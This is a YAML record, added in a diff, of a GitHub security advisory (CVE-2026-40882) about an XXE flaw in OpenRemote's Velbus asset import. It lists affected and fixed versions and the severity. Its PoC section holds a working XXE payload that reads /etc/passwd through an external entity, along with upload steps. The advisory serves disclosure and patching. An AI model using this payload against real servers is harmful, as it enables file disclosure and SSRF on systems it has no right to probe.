@@ -1,0 +1,147 @@
+advisory_id: GHSA-g24f-mgc3-jwwc
+datasource_id: github_osv/GHSA-g24f-mgc3-jwwc
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-g24f-mgc3-jwwc/GHSA-g24f-mgc3-jwwc.json
+aliases:
+  - CVE-2026-40882
+summary: |
+  OpenRemote has XXE in Velbus Asset Import
+  ### Summary
+  The Velbus asset import path parses attacker-controlled XML without explicit XXE hardening. An authenticated user who can call the import endpoint may trigger XML external entity processing, which can lead to server-side file disclosure and SSRF. The target file must be less than 1023 characters.
+
+  ### Details
+  Velbus import uses `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(...)` on untrusted XML input, without explicit safeguards to disable DTD/external entities.
+
+  ```154:165:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java
+      @Override
+      public Future<Void> startAssetImport(byte[] fileData, Consumer<AssetTreeNode[]> assetConsumer) {
+
+          return executorService.submit(() -> {
+              Document xmlDoc;
+              try {
+                  String xmlStr = new String(fileData, StandardCharsets.UTF_8);
+                  LOG.info("Parsing VELBUS project file");
+
+                  xmlDoc = DocumentBuilderFactory
+                      .newInstance()
+                      .newDocumentBuilder()
+                      .parse(new InputSource(new StringReader(xmlStr)));
+  ```
+
+  Expanded `Caption` content is propagated into created asset names:
+
+  ```193:198:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java
+                  String name = module.getElementsByTagName("Caption").item(0).getTextContent();
+                  name = isNullOrEmpty(name) ? deviceType.toString() : name;
+
+                  // TODO: Use device specific asset types
+                  Asset<?> device = new ThingAsset(name);
+  ```
+
+  ### PoC
+  1. Log in to a realm with a user that can call Velbus asset import.
+  2. Create/select a Velbus TCP Agent in that same realm.
+  3. Send `POST /api/{realm}/agent/assetImport/{agentId}` with a Velbus project XML payload and compare behavior against a baseline import file.
+  3. Save the below code as a `xxe.xml` and upload to `Setup` under `https://localhost/manager/?realm=<YOUR_REALM>#/assets/false/<ASSET_ID>`. Chnage the `file:///etc/passwd` to another file if your `passwd` is longer than 1023 characters.
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE velbus [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <Project>
+    <Module type="VMB1RY" address="01" build="00" serial="LAB">
+      <Caption>&xxe;</Caption>
+    </Module>
+  </Project>
+  ```
+
+  As long as the file content is under 1023 characters, the exploit will succeed.
+  <img width="1200" height="662" alt="image" src="https://github.com/user-attachments/assets/213f063d-98b6-4717-b98c-f4255952026b" />
+
+  If the file content reaches the limit, an error is thrown.
+  <img width="1200" height="630" alt="image" src="https://github.com/user-attachments/assets/ee177a6b-2cb2-48ae-94df-c994ecb41429" />
+
+
+  ### Impact
+  - **Type:** XML External Entity (XXE)
+  - **Affected:** Deployments exposing Velbus import to authenticated users with import access
+  - **Risk:** limited local file disclosure (as long as the file is under 1023 characters) from the Manager runtime, and SSRF.
+impacted_packages:
+  - purl: pkg:maven/io.openremote/openremote-manager
+    affected_versions: vers:maven/<=1.21.0
+    fixed_versions: vers:maven/1.22.0
+    affected_packages:
+      - pkg:maven/io.openremote/openremote-manager@1.2.0
+      - pkg:maven/io.openremote/openremote-manager@1.2.1
+      - pkg:maven/io.openremote/openremote-manager@1.2.2
+      - pkg:maven/io.openremote/openremote-manager@1.2.3
+      - pkg:maven/io.openremote/openremote-manager@1.2.4
+      - pkg:maven/io.openremote/openremote-manager@1.3.0
+      - pkg:maven/io.openremote/openremote-manager@1.3.1
+      - pkg:maven/io.openremote/openremote-manager@1.3.2
+      - pkg:maven/io.openremote/openremote-manager@1.3.3
+      - pkg:maven/io.openremote/openremote-manager@1.3.4
+      - pkg:maven/io.openremote/openremote-manager@1.3.5
+      - pkg:maven/io.openremote/openremote-manager@1.4.0
+      - pkg:maven/io.openremote/openremote-manager@1.5.0
+      - pkg:maven/io.openremote/openremote-manager@1.6.0
+      - pkg:maven/io.openremote/openremote-manager@1.6.2
+      - pkg:maven/io.openremote/openremote-manager@1.6.3
+      - pkg:maven/io.openremote/openremote-manager@1.6.4
+      - pkg:maven/io.openremote/openremote-manager@1.6.5
+      - pkg:maven/io.openremote/openremote-manager@1.7.0
+      - pkg:maven/io.openremote/openremote-manager@1.8.0
+      - pkg:maven/io.openremote/openremote-manager@1.8.1
+      - pkg:maven/io.openremote/openremote-manager@1.9.0
+      - pkg:maven/io.openremote/openremote-manager@1.10.0
+      - pkg:maven/io.openremote/openremote-manager@1.11.0
+      - pkg:maven/io.openremote/openremote-manager@1.11.1
+      - pkg:maven/io.openremote/openremote-manager@1.11.2
+      - pkg:maven/io.openremote/openremote-manager@1.11.3
+      - pkg:maven/io.openremote/openremote-manager@1.12.0
+      - pkg:maven/io.openremote/openremote-manager@1.12.1
+      - pkg:maven/io.openremote/openremote-manager@1.12.3
+      - pkg:maven/io.openremote/openremote-manager@1.13.0
+      - pkg:maven/io.openremote/openremote-manager@1.13.1
+      - pkg:maven/io.openremote/openremote-manager@1.14.0
+      - pkg:maven/io.openremote/openremote-manager@1.15.0
+      - pkg:maven/io.openremote/openremote-manager@1.15.1
+      - pkg:maven/io.openremote/openremote-manager@1.15.2
+      - pkg:maven/io.openremote/openremote-manager@1.16.1
+      - pkg:maven/io.openremote/openremote-manager@1.17.0
+      - pkg:maven/io.openremote/openremote-manager@1.17.1
+      - pkg:maven/io.openremote/openremote-manager@1.17.2
+      - pkg:maven/io.openremote/openremote-manager@1.17.3
+      - pkg:maven/io.openremote/openremote-manager@1.18.0
+      - pkg:maven/io.openremote/openremote-manager@1.19.0
+      - pkg:maven/io.openremote/openremote-manager@1.20.0
+      - pkg:maven/io.openremote/openremote-manager@1.20.1
+      - pkg:maven/io.openremote/openremote-manager@1.20.2
+      - pkg:maven/io.openremote/openremote-manager@1.21.0
+    fixed_packages:
+      - pkg:maven/io.openremote/openremote-manager@1.22.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-g24f-mgc3-jwwc/GHSA-g24f-mgc3-jwwc.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-611
+references:
+  - url: https://github.com/openremote/openremote
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-40882
+    reference_type:
+    reference_id: CVE-2026-40882
+  - url: https://github.com/openremote/openremote/security/advisories/GHSA-g24f-mgc3-jwwc
+    reference_type:
+    reference_id: GHSA-g24f-mgc3-jwwc
+exploits: []
